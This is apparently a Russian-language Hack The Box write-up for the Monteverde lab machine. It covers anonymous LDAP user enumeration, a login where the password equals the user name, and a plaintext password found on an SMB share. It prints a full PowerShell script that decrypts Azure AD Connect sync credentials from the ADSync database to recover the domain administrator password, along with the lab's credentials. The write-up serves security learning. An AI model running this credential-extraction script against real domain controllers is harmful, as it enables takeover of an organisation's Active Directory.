---
layout: post
title: Райтап HTB Monteverde
lang: ru
categories: [Offensive, HTB]
tags: [windows, active-directory, Azure, AD-Connect, ldap]
permalink: /posts/2024-10-01-monteverde-htb-writeup
---


## Введение
Привет, хакеры! В этой статье мы будем извлекать информацию о пользователях из LDAP, выясним, как работать с Azure AD connect, и используем это, чтобы получить пароль администратора в открытом виде. Эта машина показалась мне довольно сложной, но я узнал много нового о powershell и sql, а также об интеграции Azure <-> AD.
## Enumeration
![8989624cbb85ec844a58e045f7fa3cf9.png]({{ site.baseurl }}/images/8989624cbb85ec844a58e045f7fa3cf9.png)

#### LDAP 
Оказалось, что нам доступно анонимное подключение к LDAP: `godap -u '' -p '' monteverde.htb`

### Дампим пользователей через LDAP
Давайте сдампим пользователей чтобы попробовать подобрать пароли.

```bash
ldapsearch -x -H ldap://monteverde.htb -b "dc=MEGABANK,dc=LOCAL" "(objectClass=user)" userPrincipalName > userprincipalname.dump
```

![72d9c0143df60c87cd6ce6a280ae9c26.png]({{ site.baseurl }}/images/72d9c0143df60c87cd6ce6a280ae9c26.png)

Теперь получим только имена с помощь grep и регулярного выражения:
```bash
grep -o -oP 'userPrincipalName:\s*([a-zA-Z0-9-]+)@[a-zA-Z0-9]+\.[a-zA-Z0-9]+' userprincipalname.dump | cut -d '@' -f 1 | cut -d ':' -f 2
```
![2f354e0f72d5b7753e2352bb4f1ef49b.png]({{ site.baseurl }}/images/2f354e0f72d5b7753e2352bb4f1ef49b.png)

#### Логин под пользователем SABatchJobs
![745e03f92cf6bfd674c037043065c59a.png]({{ site.baseurl }}/images/745e03f92cf6bfd674c037043065c59a.png)

Как видите, у одного из пользователей пароль равен его имени пользователя. Это позволило нам войти в систему. 

`SABatchJobs:SABatchJobs`

*Честно говоря, я думаю, что это довольно глупо для средней машины, никакая современная парольная политика не позволит такого, помимо того это довольно неочевидный путь, все отвыкли от таких банальных вещей (может это и правильно что нам об этом напомнили). Мне пришлось зайти на форумы, чтобы найти чей-то пост, где намекали, что следует попробовать что-то очень банальное.*

### SMB
![0f54a3e1f91aa2312411209caa72245d.png]({{ site.baseurl }}/images/0f54a3e1f91aa2312411209caa72245d.png)

У нас есть доступ к нестандартному ресурсу под названием `users$`, единственная директория, в которой что-то есть, - `mhope`. Мы находим файл azure.xml, который содержит пароль этого пользователя.
![01873a69f5da4fe0ba67b54e323ae312.png]({{ site.baseurl }}/images/01873a69f5da4fe0ba67b54e323ae312.png)

`mhope:4n0therD4y@n0th3r$`

Как вы видите ниже, у нас есть возможность зайти на сервер под этим пользователем.
![385b8ef7ee69b7e302b7536dd1abcda7.png]({{ site.baseurl }}/images/385b8ef7ee69b7e302b7536dd1abcda7.png)

Наш пользователь является администратором Azure, и если мы вернемся в LDAP, то увидим, что Azure AD Connect подключен на сервере, который является контроллером домена.
![fb78c26357743fadfbb44a48c23f3f80.png]({{ site.baseurl }}/images/fb78c26357743fadfbb44a48c23f3f80.png)

### Эксплуатация Azure AD Connect
Я нашёл [пост](https://blog.xpnsec.com/azuread-connect-for-redteam/) в гугле, как раз про эксплуатацию Azure AD Connect.

В нем есть скрипт, но он не работает из коробки. Поскольку он опирается на существующую файловую базу данных *(как sqlite, но microsoft)*. Однако у нас нет локальной базы данных, так как azure ad connect на этой машине, похоже, использует MSSQL на порту 1433.

*Я долго возился с этой частью, так как пытался пробросить порт 1433 на свою машину и извлечь таким образом данные нужные скрипту из БД. Однако локальная аутентификация windows не работала через туннель, о чем я в тот момент не знал.*

Как оказалось, существует полезный исполняемый файл под названием `sqlcmd`, он позволяет нам делать sql-запросы и использует локальный windows аутентификацию, такой вывод я сделал так как он работает без предъявления нами учетных данных.
![47c7708d199f589969f18f9a581d16cd.png]({{ site.baseurl }}/images/47c7708d199f589969f18f9a581d16cd.png)

Хотя извлечение первой части информации, необходимой для нашего скрипта, прошло нормально, вторая часть никак не хотела выводиться в формате, приемлемом для скрипта.
![8b6480e1ce21d62ee9e4f9ebfa8cf2b6.png]({{ site.baseurl }}/images/8b6480e1ce21d62ee9e4f9ebfa8cf2b6.png)

Итак, перепробовав миллион способов передачи строки sql-соединения в powershell, я написал финальную версию скрипта, который использовал БД MSSQL вместо локальной и он сработал!
```powershell

Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"

$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()


#$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM
mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

```

Благодаря скрипту выше мы получили пароль администратора. Это позволило нам войти в систему через winrm.
![a2f6294666c0c02fc4d02f07f61969a7.png]({{ site.baseurl }}/images/a2f6294666c0c02fc4d02f07f61969a7.png)

`Administrator:d0m@in4dminyeah!`

Запавнено!
